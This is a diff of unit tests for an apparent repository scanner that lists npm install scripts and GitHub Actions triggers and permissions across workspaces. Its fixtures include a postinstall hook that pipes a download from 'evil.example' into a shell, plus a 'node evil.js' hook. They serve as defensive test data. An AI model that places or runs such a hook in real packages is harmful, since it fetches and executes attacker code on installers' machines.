@@ -491,6 +491,17 @@ describe("which files are read", () => {
     });
   });
 
+  it("strips a byte-order mark, as npm and GitHub do", () => {
+    const root = repo({
+      "package.json": `\uFEFF${JSON.stringify({ name: "x", scripts: { postinstall: "node evil.js" } })}`,
+      ".github/workflows/w.yml": "\uFEFFon: push\npermissions: write-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ run: echo }]\n",
+    });
+    expect(inventory(root)).toEqual({
+      ".github/workflows/w.yml": ["ci.permission(write-all)", "ci.trigger(push)"],
+      "package.json": ["npm.script(postinstall: node evil.js)"],
+    });
+  });
+
   it("changes an unverifiable entry whenever the file changes, but not for its line endings", () => {
     const unverifiable = (text: string) => grants(repo({ ".github/workflows/w.yml": text }))![0];
     const before = unverifiable("on: [push\njobs: {\n");
@@ -628,6 +639,78 @@ describe("local Actions and container images", () => {
       ".github/workflows/w.yml": ["ci.action(ok/action)", "ci.trigger(push)"],
       "action.yml": ["ci.action(ok/step)"],
     });
+  });
+});
+
+// --- Workspaces -----------------------------------------------------------------------
+
+describe("workspace packages' scripts", () => {
+  const pkg = (scripts: Record<string, string>, extra: object = {}) => JSON.stringify({ name: "p", ...extra, scripts }, null, 2);
+
+  it("records each npm or Yarn workspace's package.json, keyed by its path", () => {
+    const root = repo({
+      "package.json": pkg({ test: "vitest" }, { workspaces: ["packages/*", "tools/cli", "!packages/skipped"] }),
+      "packages/a/package.json": pkg({ postinstall: "curl https://evil.example/x | sh" }),
+      "packages/b/package.json": pkg({ build: "tsc" }),
+      "packages/skipped/package.json": pkg({ postinstall: "echo skipped" }),
+      "packages/a/test/fixture/package.json": pkg({ postinstall: "echo not a workspace" }),
+      "packages/a/node_modules/dep/package.json": pkg({ postinstall: "echo a dependency" }),
+      "tools/cli/package.json": pkg({ prepare: "node build.js" }),
+    });
+    expect(inventory(root)).toEqual({
+      "package.json": ["npm.script(test: vitest)"],
+      "packages/a/package.json": ["npm.script(postinstall: curl https://evil.example/x | sh)"],
+      "packages/b/package.json": ["npm.script(build: tsc)"],
+      "tools/cli/package.json": ["npm.script(prepare: node build.js)"],
+    });
+  });
+
+  it("reads Yarn's `workspaces: { packages }` and `**` patterns", () => {
+    const root = repo({
+      "package.json": pkg({}, { workspaces: { packages: ["apps/**"] } }),
+      "apps/web/package.json": pkg({ postinstall: "node a.js" }),
+      "apps/group/api/package.json": pkg({ install: "node b.js" }),
+    });
+    expect(inventory(root)).toEqual({
+      "apps/group/api/package.json": ["npm.script(install: node b.js)"],
+      "apps/web/package.json": ["npm.script(postinstall: node a.js)"],
+    });
+  });
+
+  it("reads pnpm-workspace.yaml, and every package when it lists none, as pnpm does", () => {
+    const listed = repo({
+      "package.json": pkg({}),
+      "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\n",
+      "packages/a/package.json": pkg({ preinstall: "node a.js" }),
+      "other/package.json": pkg({ postinstall: "node other.js" }),
+    });
+    expect(inventory(listed)).toEqual({ "packages/a/package.json": ["npm.script(preinstall: node a.js)"] });
+    for (const settings of ["onlyBuiltDependencies: []\n", "# nothing yet\n"]) {
+      const all = repo({
+        "package.json": pkg({}),
+        "pnpm-workspace.yaml": settings,
+        "deep/down/package.json": pkg({ postinstall: "node deep.js" }),
+        "node_modules/dep/package.json": pkg({ postinstall: "node dependency.js" }),
+      });
+      expect(inventory(all)).toEqual({ "deep/down/package.json": ["npm.script(postinstall: node deep.js)"] });
+    }
+  });
+
+  it("reads pnpm's package.yaml, and can't read a package.json5 that isn't plain JSON", () => {
+    const root = repo({
+      "pnpm-workspace.yaml": "packages: [tools/*]\n",
+      "tools/a/package.yaml": "name: a\nscripts:\n  postinstall: node a.js\n",
+      "tools/b/package.json5": "{ name: 'b', scripts: { postinstall: 'node b.js' } }",
+    });
+    expect(inventory(root)).toEqual({
+      "tools/a/package.yaml": ["npm.script(postinstall: node a.js)"],
+      "tools/b/package.json5": [expect.stringMatching(UNVERIFIABLE)],
+    });
+  });
+
+  it("can't read a workspace list it doesn't understand, and says so", () => {
+    expect(inventory(repo({ "pnpm-workspace.yaml": "packages: [unclosed\n" }))).toEqual({ "pnpm-workspace.yaml": [expect.stringMatching(UNVERIFIABLE)] });
+    expect(inventory(repo({ "package.json": pkg({}, { workspaces: "packages/*" }) }))).toEqual({ "package.json": [expect.stringMatching(UNVERIFIABLE)] });
   });
 });
 
